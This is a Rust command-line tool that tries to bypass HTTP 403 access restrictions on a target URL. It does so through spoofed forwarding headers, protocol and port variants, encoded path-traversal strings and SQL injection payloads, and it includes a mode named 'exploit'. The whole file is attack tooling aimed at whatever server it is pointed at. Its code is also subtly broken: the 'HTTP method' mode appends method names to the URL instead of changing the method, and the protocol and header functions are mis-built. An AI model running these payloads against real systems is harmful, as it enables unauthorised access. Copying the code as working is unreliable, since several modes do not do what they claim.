use clap::{Arg, App};
   use reqwest::Client;
   use std::time::Instant;
   use tokio::time::{sleep, Duration};

   async fn make_request(client: &Client, target: &str, suffix: &str) {
       let url = format!("{}{}", target, suffix);
       let start = Instant::now();
       let response = client.get(&url)
           .header("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
           .send()
           .await
           .unwrap();

       let status = response.status();
       let duration = start.elapsed();

       println!("Payload [{}]: Status: {}, Time: {:?}", suffix, status, duration);
   }

   async fn header_bypass(client: &Client, target: &str) {
       let headers = [
           ("X-Original-URL", target),
           ("X-Forwarded-For", "127.0.0.1"),
           ("X-Forwarded-Host", "localhost"),
       ];

       let mut tasks = vec![];

       for &(header, value) in &headers {
           let client_clone = client.clone();
           let target_clone = target.to_string();
           let header_clone = header.to_string();
           let value_clone = value.to_string();
           tasks.push(tokio::spawn(async move {
               let response = client_clone.get(&target_clone)
                   .header(header_clone, value_clone)
                   .send()
                   .await
                   .unwrap();

               let status = response.status();
               println!("Header [{}]: Status: {}", header, status);
           }));
       }

       for task in tasks {
           task.await.unwrap();
       }
   }

   async fn protocol_bypass(client: &Client, target: &str) {
       let protocols = ["http://", "https://"];

       let mut tasks = vec![];

       for &protocol in &protocols {
           let client_clone = client.clone();
           let url = format!("{}{}", protocol, target);
           tasks.push(tokio::spawn(async move {
               make_request(&client_clone, &url, "").await;
           }));
       }

       for task in tasks {
           task.await.unwrap();
       }
   }

   async fn port_bypass(client: &Client, target: &str) {
       let ports = [80, 443, 8080, 8443];

       let mut tasks = vec![];

       for &port in &ports {
           let client_clone = client.clone();
           let url = format!("{}:{}", target, port);
           tasks.push(tokio::spawn(async move {
               make_request(&client_clone, &url, "").await;
           }));
       }

       for task in tasks {
           task.await.unwrap();
       }
   }

   async fn http_method_bypass(client: &Client, target: &str) {
       let methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS"];
       let mut tasks = vec![];

       for &method in &methods {
           let client_clone = client.clone();
           let target_clone = target.to_string();
           tasks.push(tokio::spawn(async move {
               make_request(&client_clone, &target_clone, method).await;
           }));
       }

       for task in tasks {
           task.await.unwrap();
       }
   }

   async fn url_encode_bypass(client: &Client, target: &str) {
       let encodings = ["%2e", "%2e%2e", "%2e%2e%2f"];
       let mut tasks = vec![];

       for &encoding in &encodings {
           let client_clone = client.clone();
           let url = format!("{}{}", target, encoding);
           tasks.push(tokio::spawn(async move {
               make_request(&client_clone, &url, "").await;
           }));
       }

       for task in tasks {
           task.await.unwrap();
       }
   }

   async fn sqli_detection(client: &Client, target: &str) {
       let sqli_payloads = ["' OR 1=1 --", "' AND 1=0 --", "' UNION SELECT 1,2,3 --"];
       let mut tasks = vec![];

       for &payload in &sqli_payloads {
           let client_clone = client.clone();
           let url = format!("{}{}", target, payload);
           tasks.push(tokio::spawn(async move {
               make_request(&client_clone, &url, "").await;
           }));
       }

       for task in tasks {
           task.await.unwrap();
       }
   }

   async fn exploit_mode(client: &Client, target: &str) {
       let exploits = ["%2e%2e%2f", "%2e%2e%2f..%2f", "%2e%2e%2f..%2f..%2f"];
       let mut tasks = vec![];

       for &exploit in &exploits {
           let client_clone = client.clone();
           let url = format!("{}{}", target, exploit);
           tasks.push(tokio::spawn(async move {
               make_request(&client_clone, &url, "").await;
           }));
       }

       for task in tasks {
           task.await.unwrap();
       }
   }

   #[tokio::main]
   async fn main() {
       let matches = App::new("403 Bypass")
           .version("1.0")
           .author("Author Name <email@example.com>")
           .about("Bypasses 403 Forbidden responses")
           .arg(Arg::new("target")
               .about("Target URL")
               .required(true)
               .index(1))
           .arg(Arg::new("mode")
               .about("Bypass mode")
               .required(true)
               .possible_values(&["header", "proto", "port", "HTTPmethod", "encode", "sqli", "exploit"]))
           .get_matches();

       let target = matches.value_of("target").unwrap();
       let mode = matches.value_of("mode").unwrap();

       let client = Client::new();

       match mode {
           "header" => header_bypass(&client, target).await,
           "proto" => protocol_bypass(&client, target).await,
           "port" => port_bypass(&client, target).await,
           "HTTPmethod" => http_method_bypass(&client, target).await,
           "encode" => url_encode_bypass(&client, target).await,
           "sqli" => sqli_detection(&client, target).await,
           "exploit" => exploit_mode(&client, target).await,
           _ => unreachable!(),
       }
   }